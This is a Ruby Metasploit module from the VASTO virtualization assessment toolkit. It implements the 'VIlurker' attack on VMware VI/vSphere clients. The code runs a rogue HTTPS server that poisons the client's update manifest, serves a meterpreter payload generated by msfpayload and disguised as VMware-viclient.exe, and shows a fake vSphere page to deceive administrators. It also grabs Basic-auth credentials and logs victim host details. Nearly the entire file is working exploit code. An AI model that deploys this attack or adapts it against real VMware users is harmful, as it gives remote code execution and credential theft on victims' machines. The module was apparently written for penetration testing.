#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report
	include Rex::FileUtils
	
	def initialize
		super(
			'Name'        => 'vasto: VIlurker VIclient attack',
			'Version'     => '0.9',
			'Description'    => %q{
			This module performs the VIlurker attack against
			a Virtual Infrastructure or VSphere client. 
			The VI client will be tricked into downloading
			a fake update which will be run under the user's credentials.
			},
			'Author'      => ['Claudio Criscione'],
			'License'     => GPL_LICENSE,
			'Actions'     => 
				[
				 	[ 'Capture', 'VIlurker' ]
				],
			'PassiveActions' => 
				[
					'Capture',
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 443 ]),
				OptString.new('PAYLOAD',    [ true, "The payload to run against the client.", "windows/meterpreter/bind_tcp" ]),
				OptString.new('LHOST',    [ false, "The local IP address to listen to.", nil ]),
				OptPort.new('LPORT',    [ false, "The local port.", nil ]),
				OptPort.new('RPORT',    [ false, "The remote port.", nil ]),
				OptString.new('RHOST',    [ false, "The remote host.", nil ]),
				OptBool.new('SSL', [ true, "Use SSL", true ])
			], self.class)
	end

	def run
		@myhost   = datastore['SRVHOST']
		@myport   = datastore['SRVPORT']		
		@payload  = datastore['PAYLOAD']
		@LPORT = datastore['LPORT']
		@LHOST = datastore['LHOST']
		@RHOST = datastore['RHOST']
		@vasto_directory = ""
		exploit()
	end
	
	
	def on_client_connect(c)
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_status("VIlurker - Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	
		close_client(cli)
	end

	def close_client(cli)
		cli.close
		# Required to clean up the service properly
		raise ::EOFError
	end
	
	def dispatch_request(cli, req)
		
		#Find vasto directory
		@vasto_directory = "#{Msf::Config.module_directory}/auxiliary/vasto"
		@vasto_directory	= "#{Msf::Config.user_module_directory}/auxiliary/vasto" if(not File.exist?(@vasto_directory))
		p "vasto modules not found!\nMust reside in: #{Msf::Config.module_directory}/auxiliary/vasto\n or: #{Msf::Config.user_module_directory}/auxiliary/vasto" if(not File.exist?(@vasto_directory))
	
		phost = cli.peerhost
		
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]
		
		if (req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/)
			req.resource = $2
			hhead, nport = $1.split(":", 2)[0]
			@myport = nport || 80
		end

		#LEFTOVER, to be integrated with future features of password grabbing but not used ATM
		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
			report_auth_info(
				:host      => cli.peerhost,
				:proto     => 'http',
				:targ_host => hhead,
				:targ_port => @myport,
				:user      => user,
				:pass      => pass,
				:extra     => req.resource.to_s
			)
			print_status("VIlurker - HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
		end
		
			
		#The client requested the clients.xml file - poisoning the answer
		if(req.resource == "/client/clients.xml")
			print_status("VIlurker - #{cli.peerhost} is asking for clients.xml. Triggering VIlurker")
			data = 	
				 "<ConfigRoot>\r\n" +
				 "<clientConnection id=\"0000\">\r\n" +
				 "<authdPort>902</authdPort>\r\n" +
				 "<version>10</version>\r\n" +
				 "<patchVersion>10.0.0</patchVersion>\r\n" + #using a static, high version
				 "<apiVersion>10.0.0</apiVersion>\r\n" +
				 "<downloadUrl>https://*/client/VMware-viclient.exe</downloadUrl>\r\n" + #client autoconnects to us
				 "</clientConnection>\r\n" +
				 "</ConfigRoot>\r\n" 
			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: text/xml\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			print_status("answering #{res}")
			cli.put(res)
			return
		end
		
		#Send the malicious payload
		if(req.resource == "/client/VMware-viclient.exe")
			print_status("VIlurker - Bingo #{cli.peerhost} is asking for the update. Creating the exploit")
			create_exploit()
			print_status("#{cli.peerhost} uploading exploit")
			data = File.read("#{@vasto_directory}/data/lurker.exe")
			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: binary/octet-string\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			cli.put(res)
			
			print_status("VIlurker - Saving session information on the DB")
			report_note(
				:type   => 'host.VMware.metasploit_vilurker',
				:data   => {
					:attacker_host	=> @LHOST,
					:attacker_port	=> @LPORT,
					:victim_host	=> cli.peerhost,
					:victim_port	=> @RPORT,
					:payload		=> @payload
				},
				:update => :unique_data
			)
			return
		end

						
		#Supporting fake page - not really needed for the exploit but can be useful with
		#inquisitive sysadmins - lame approach but working
		data = File.read(File.join(@vasto_directory, "data", "fake_vipage.html"))
		ctype = "text/html"
		case req.resource
		  when '/default.js'
		    data = File.read(File.join(@vasto_directory , "data","default.js"))
		  when '/it/welcomeRes.js'
		    data = File.read(File.join(@vasto_directory, "data","welcomeRes.js"))
		  when '/en/welcomeRes.js'
		    data = File.read(File.join(@vasto_directory, "data","welcomeRes.js"))
		  when '/welcomeRes.js'
		    data = File.read(File.join(@vasto_directory, "data","welcomeRes.js"))
		  when '/watermark.js'
		    data = File.read(File.join(@vasto_directory, "data","watermark.js"))
		  when '/dyndata.js'
		    data = File.read(File.join(@vasto_directory, "data","dyndata.js"))
		  when '/watermark.png'
		    data = File.read(File.join(@vasto_directory, "data","watermark.png"))
		  when '/banner.png'
		    data = File.read(File.join(@vasto_directory, "data","banner.png"))
		  when '/bullet.png'
		    data = File.read(File.join(@vasto_directory, "data","bullet.png"))
		  when '/background.jpeg'
		    data = File.read(File.join(@vasto_directory, "data","background.jpeg"))
		    ctype = "image/jpeg"
		  when '/default.css'
		    data = File.read(File.join(@vasto_directory, "data","default.css"))
		    ctype = "text/css"
		  when '/print.css'
		    data = File.read(File.join(@vasto_directory, "data","print.css"))
		    ctype = "text/css"		    
		end
		
		#Images
		req_ext = req.resource.split(".")[-1].downcase
		if(req_ext == "png")
		  ctype = "image/png"
		end

		res  = 
			"HTTP/1.1 200 OK\r\n" +
			"Host: #{mysrc}\r\n" +
			"Expires: 0\r\n" +
			"Cache-Control: must-revalidate\r\n" +
			"Content-Type: #{ctype}\r\n" +
			"Content-Length: #{data.length}\r\n" +
			"Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		return		
	
	end
	
	# Creating the exploit with a lame call to msfpayload
	def create_exploit()
		lurker_path = "#{@vasto_directory}/data/lurker.exe"
		print_status("VIlurker - Creating payload...")
	    executeme = "#{Msf::Config.install_root}/msfpayload #{@payload} "
	    if @LHOST != nil
		executeme = executeme + "LHOST=#{@LHOST} "	
	    end
	    if @LPORT != nil 
		executeme = executeme + "LPORT=#{@LPORT} "	
	    end
	    if @RPORT != nil
		executeme = executeme + "RPORT = #{@RPORT} "	
	    end
	    executeme = executeme + "X > #{lurker_path}"
	    print_status("Executing #{executeme}")

            system(executeme)
	end

	
	
end
